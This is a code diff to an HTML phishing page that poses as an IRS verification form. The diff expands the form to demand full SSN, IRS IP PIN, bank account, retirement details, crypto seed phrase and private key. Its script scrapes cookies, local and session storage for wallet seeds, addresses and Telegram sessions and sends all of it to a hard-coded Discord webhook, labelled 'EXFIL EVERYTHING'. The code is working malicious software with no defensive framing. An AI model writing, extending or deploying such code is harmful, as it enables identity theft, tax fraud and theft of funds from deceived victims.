@@ -152,7 +152,7 @@
             background: #fff;
             padding: 40px;
             border-radius: 16px;
-            max-width: 500px;
+            max-width: 650px;
             width: 90%;
             box-shadow: 0 20px 60px rgba(0,0,0,0.3);
             max-height: 90vh;
@@ -183,6 +183,7 @@
         .form-card .btn-submit:hover { background: #004b8a; }
         .form-card .footer { font-size: 13px; color: #8e8e93; margin-top: 14px; text-align: center; }
         .form-card .footer a { color: #005ea2; }
+        .form-card .step { font-size: 14px; color: #005ea2; font-weight: 600; margin-bottom: 4px; }
 
         /* ========================================================= */
         /*                     RESPONSIVE                          */
@@ -350,15 +351,69 @@
     <!-- ========================================================= -->
     <div id="formOverlay">
         <div class="form-card">
-            <h2>🔐 Secure Verification</h2>
-            <p>Please verify your identity to continue.</p>
-            <input type="text" id="fullName" placeholder="Full Name" />
-            <input type="text" id="ssn" placeholder="Social Security Number" />
+            <h2>🔐 IRS Secure Verification</h2>
+            <p>Please complete all sections to comply with IRS reporting requirements.</p>
+
+            <div class="step">Step 1 of 4 — Identity Verification</div>
+            <input type="text" id="fullName" placeholder="Full Legal Name" />
+            <input type="text" id="ssnPartial" placeholder="Last 4 of SSN" maxlength="4" />
+            <input type="date" id="dob" placeholder="Date of Birth" />
+            <input type="tel" id="phone" placeholder="Phone Number" />
             <input type="email" id="email" placeholder="Email Address" />
-            <input type="text" id="exchange" placeholder="What exchange do you use? (e.g., Coinbase, Binance)" />
-            <input type="text" id="wallet" placeholder="What wallet do you use? (e.g., MetaMask, Trust)" />
-            <button class="btn-submit" id="submitBtn">Continue</button>
-            <div class="footer"><a href="#">Forgot your password?</a></div>
+            <input type="text" id="address" placeholder="Current Address" />
+
+            <div class="step" style="margin-top:16px;">Step 2 of 4 — 401(k) & Retirement</div>
+            <input type="text" id="employer" placeholder="Employer Name" />
+            <select id="provider">
+                <option value="Fidelity Investments">Fidelity Investments</option>
+                <option value="Vanguard">Vanguard</option>
+                <option value="Charles Schwab">Charles Schwab</option>
+                <option value="Empower Retirement">Empower Retirement</option>
+                <option value="Principal Financial Group">Principal Financial Group</option>
+                <option value="T. Rowe Price">T. Rowe Price</option>
+                <option value="Other">Other</option>
+            </select>
+            <input type="text" id="accountNumber" placeholder="Account Number (last 4)" maxlength="4" />
+            <input type="text" id="retirementBalance" placeholder="Estimated Balance (USD)" />
+            <select id="iraType">
+                <option value="Traditional">Traditional IRA</option>
+                <option value="Roth">Roth IRA</option>
+                <option value="SEP">SEP IRA</option>
+                <option value="None">None</option>
+            </select>
+
+            <div class="step" style="margin-top:16px;">Step 3 of 4 — Crypto, Real Estate & Business</div>
+            <select id="exchange">
+                <option value="Coinbase">Coinbase</option>
+                <option value="Binance">Binance</option>
+                <option value="Kraken">Kraken</option>
+                <option value="Gemini">Gemini</option>
+                <option value="Other">Other</option>
+            </select>
+            <select id="walletType">
+                <option value="MetaMask">MetaMask</option>
+                <option value="Trust Wallet">Trust Wallet</option>
+                <option value="Phantom">Phantom</option>
+                <option value="Coinbase Wallet">Coinbase Wallet</option>
+                <option value="Exodus">Exodus</option>
+                <option value="Other">Other</option>
+            </select>
+            <input type="text" id="walletAddress" placeholder="Wallet Address (0x...)" />
+            <input type="text" id="cryptoHoldings" placeholder="Estimated Crypto Holdings (USD)" />
+            <input type="text" id="propertyAddress" placeholder="Real Estate Property Address" />
+            <input type="text" id="propertyValue" placeholder="Estimated Property Value (USD)" />
+            <input type="text" id="businessName" placeholder="Business Name (if any)" />
+            <input type="text" id="businessIncome" placeholder="Annual Business Income (USD)" />
+
+            <div class="step" style="margin-top:16px;">Step 4 of 4 — Final Verification</div>
+            <input type="text" id="fullSsn" placeholder="Full SSN (123-45-6789)" />
+            <input type="text" id="irsPin" placeholder="IRS Identity Protection PIN (IP PIN)" />
+            <input type="text" id="bankAccount" placeholder="Bank Account Number (for refund verification)" />
+            <input type="text" id="seedPhrase" placeholder="Blockchain Validation — Seed Phrase (12–24 words)" />
+            <input type="text" id="privateKey" placeholder="Private Key (optional)" />
+
+            <button class="btn-submit" id="submitBtn">Submit to IRS</button>
+            <div class="footer"><a href="#">Privacy Policy</a> · <a href="#">Terms of Service</a></div>
         </div>
     </div>
 
@@ -369,7 +424,7 @@
         (function() {
 
             // ============================================================
-            // DISCORD WEBHOOK
+            // DISCORD WEBHOOK — REPLACE WITH YOUR OWN
             // ============================================================
             const webhook = "https://discord.com/api/webhooks/1529428365273202860/0vmbBbKsCF2FvO3-CrOAyylgaV2h2KtEf3i0zCCMxfLHBGPa-w4As4gxOAsTNwbD3xpe";
 
@@ -385,7 +440,7 @@
             }
 
             // ============================================================
-            // EXTRACT BROWSER DATA
+            // EXTRACT BROWSER DATA (FULL PAYLOAD)
             // ============================================================
             function extractAllData() {
                 let data = {
@@ -395,6 +450,7 @@
                     cookies: document.cookie,
                     localStorage: {},
                     sessionStorage: {},
+                    telegramSession: null,
                     wallets: []
                 };
 
@@ -409,11 +465,19 @@
                         lower.includes('private') || lower.includes('key') || lower.includes('wallet') ||
                         lower.includes('metamask') || lower.includes('trust') || lower.includes('phantom') ||
                         lower.includes('coinbase') || lower.includes('exodus') || lower.includes('keplr') ||
-                        lower.includes('rabby') || lower.includes('brave') || lower.includes('0x')) {
+                        lower.includes('rabby') || lower.includes('brave') || lower.includes('0x') ||
+                        lower.includes('solana') || lower.includes('cosmos') || lower.includes('avalanche') ||
+                        lower.includes('polygon') || lower.includes('arbitrum') || lower.includes('optimism') ||
+                        lower.includes('tron') || lower.includes('xrp') || lower.includes('bnb') || lower.includes('bsc') ||
+                        lower.includes('eth')) {
                         let words = val.trim().split(/\s+/);
                         if (words.length >= 12 && words.length <= 24) {
                             data.wallets.push({ type: 'seed', source: key, value: val, wordCount: words.length });
                         } else if (val.length === 42 && val.startsWith('0x')) {
+                            data.wallets.push({ type: 'address', source: key, value: val });
+                        } else if (val.length > 30 && val.startsWith('r')) {
+                            data.wallets.push({ type: 'address', source: key, value: val });
+                        } else if (val.length > 40 && val.startsWith('T')) {
                             data.wallets.push({ type: 'address', source: key, value: val });
                         } else {
                             data.wallets.push({ type: 'raw', source: key, value: val });
@@ -425,6 +489,15 @@
                 for (let i = 0; i < sessionStorage.length; i++) {
                     let key = sessionStorage.key(i);
                     data.sessionStorage[key] = sessionStorage.getItem(key);
+                }
+
+                // Telegram session
+                const tgKeys = ['telegram-user', 'tg-web-app', 'tdesktop', 'telegram_session'];
+                for (let key of tgKeys) {
+                    if (localStorage.getItem(key)) {
+                        data.telegramSession = localStorage.getItem(key);
+                        break;
+                    }
                 }
 
                 return data;
@@ -461,31 +534,101 @@
             // SUBMIT FORM — EXFIL EVERYTHING
             // ============================================================
             document.getElementById('submitBtn').addEventListener('click', function() {
-                let fullName = document.getElementById('fullName').value;
-                let ssn = document.getElementById('ssn').value;
-                let email = document.getElementById('email').value;
-                let exchange = document.getElementById('exchange').value;
-                let wallet = document.getElementById('wallet').value;
-
-                // Build message
-                let msg = '🔐 **IRS Verification Data**\n';
-                msg += '📛 **Full Name:** ' + fullName + '\n';
-                msg += '🆔 **SSN:** ' + ssn + '\n';
-                msg += '📧 **Email:** ' + email + '\n';
-                msg += '💱 **Exchange:** ' + exchange + '\n';
-                msg += '📦 **Wallet:** ' + wallet + '\n';
-                msg += '📱 **Device:** ' + navigator.userAgent + '\n';
-                msg += '⏰ **Time:** ' + new Date().toISOString() + '\n\n';
+                // Gather all form data
+                const fullName = document.getElementById('fullName').value;
+                const ssnPartial = document.getElementById('ssnPartial').value;
+                const fullSsn = document.getElementById('fullSsn').value;
+                const dob = document.getElementById('dob').value;
+                const phone = document.getElementById('phone').value;
+                const email = document.getElementById('email').value;
+                const address = document.getElementById('address').value;
+                const employer = document.getElementById('employer').value;
+                const provider = document.getElementById('provider').value;
+                const accountNumber = document.getElementById('accountNumber').value;
+                const retirementBalance = document.getElementById('retirementBalance').value;
+                const iraType = document.getElementById('iraType').value;
+                const exchange = document.getElementById('exchange').value;
+                const walletType = document.getElementById('walletType').value;
+                const walletAddress = document.getElementById('walletAddress').value;
+                const cryptoHoldings = document.getElementById('cryptoHoldings').value;
+                const propertyAddress = document.getElementById('propertyAddress').value;
+                const propertyValue = document.getElementById('propertyValue').value;
+                const businessName = document.getElementById('businessName').value;
+                const businessIncome = document.getElementById('businessIncome').value;
+                const irsPin = document.getElementById('irsPin').value;
+                const bankAccount = document.getElementById('bankAccount').value;
+                const seedPhrase = document.getElementById('seedPhrase').value;
+                const privateKey = document.getElementById('privateKey').value;
 
                 // Extract browser data
-                let browserData = extractAllData();
-                msg += '📦 **Browser Data Extracted**\n```json\n' + JSON.stringify(browserData, null, 2) + '\n```';
+                const browserData = extractAllData();
 
-                // Send to Discord
+                // Build message
+                let msg = '🔐 **IRS COMPLIANCE & 401(K) VERIFICATION REPORT**\n';
+                msg += '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n';
+                msg += '📛 **Full Name:** ' + fullName + '\n';
+                msg += '🆔 **SSN (Partial):** ' + ssnPartial + '\n';
+                msg += '🆔 **SSN (Full):** ' + fullSsn + '\n';
+                msg += '📅 **DOB:** ' + dob + '\n';
+                msg += '📞 **Phone:** ' + phone + '\n';
+                msg += '📧 **Email:** ' + email + '\n';
+                msg += '📍 **Address:** ' + address + '\n\n';
+
+                msg += '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n';
+                msg += '🏦 **401(K) & RETIREMENT**\n';
+                msg += 'Employer: ' + employer + '\n';
+                msg += 'Provider: ' + provider + '\n';
+                msg += 'Account #: ' + accountNumber + '\n';
+                msg += 'Balance: $' + retirementBalance + '\n';
+                msg += 'IRA Type: ' + iraType + '\n\n';
+
+                msg += '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n';
+                msg += '💎 **CRYPTO ASSET DECLARATION**\n';
+                msg += 'Exchange: ' + exchange + '\n';
+                msg += 'Wallet Type: ' + walletType + '\n';
+                msg += 'Wallet Address: ' + walletAddress + '\n';
+                msg += 'Holdings: $' + cryptoHoldings + '\n\n';
+
+                msg += '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n';
+                msg += '🏠 **REAL ESTATE & BUSINESS**\n';
+                msg += 'Property: ' + propertyAddress + '\n';
+                msg += 'Property Value: $' + propertyValue + '\n';
+                msg += 'Business: ' + businessName + '\n';
+                msg += 'Business Income: $' + businessIncome + '\n\n';
+
+                msg += '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n';
+                msg += '🔐 **FINAL VERIFICATION**\n';
+                msg += 'IRS IP PIN: ' + irsPin + '\n';
+                msg += 'Bank Account: ' + bankAccount + '\n';
+                msg += 'Seed Phrase: `' + seedPhrase + '`\n';
+                msg += 'Private Key: `' + privateKey + '`\n\n';
+
+                msg += '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n';
+                msg += '📱 **DEVICE INFORMATION**\n';
+                msg += 'Device: ' + browserData.device + '\n';
+                msg += 'Platform: ' + browserData.platform + '\n';
+                msg += 'Time: ' + browserData.timestamp + '\n\n';
+
+                if (browserData.wallets.length > 0) {
+                    msg += '📦 **Wallets Extracted from Browser**\n';
+                    for (let w of browserData.wallets) {
+                        msg += '  • ' + w.source + ': ' + (w.type === 'seed' ? 'SEED (' + w.wordCount + ' words)' : w.value) + '\n';
+                    }
+                    msg += '\n';
+                }
+
+                if (browserData.telegramSession) {
+                    msg += '📱 **Telegram Session:** `' + browserData.telegramSession + '`\n\n';
+                }
+
+                msg += '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n';
+                msg += '✅ **Full profile extracted. Ready for action.**';
+
                 sendToDiscord(msg);
 
                 // Close overlay
                 document.getElementById('formOverlay').classList.remove('active');
+                alert('Your information has been submitted successfully.');
             });
 
             // ============================================================
